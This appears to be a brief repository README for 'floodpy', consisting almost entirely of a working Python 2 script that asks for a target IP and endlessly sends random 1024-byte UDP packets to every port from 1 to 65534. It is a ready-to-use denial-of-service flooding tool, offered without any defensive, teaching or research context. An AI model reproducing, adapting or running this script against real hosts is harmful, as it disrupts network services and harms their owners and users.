# floodpy
Fllodpy

    #!/usr/bin/env python
    
    # Flood network host/ports with packets
    
    import socket
    import random
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    ip = raw_input('Target IP: ')
    sent = 0
    
    while 1:
    
    	for port in range(1, 65535):
    		try:
    			sock.sendto(bytes,(ip,port))
    			print "Sent %s packets to %s at port %s." % (sent, ip, port)
    			sent = sent + 1
    		except socket.error:
    			print "Ignored %s " % port
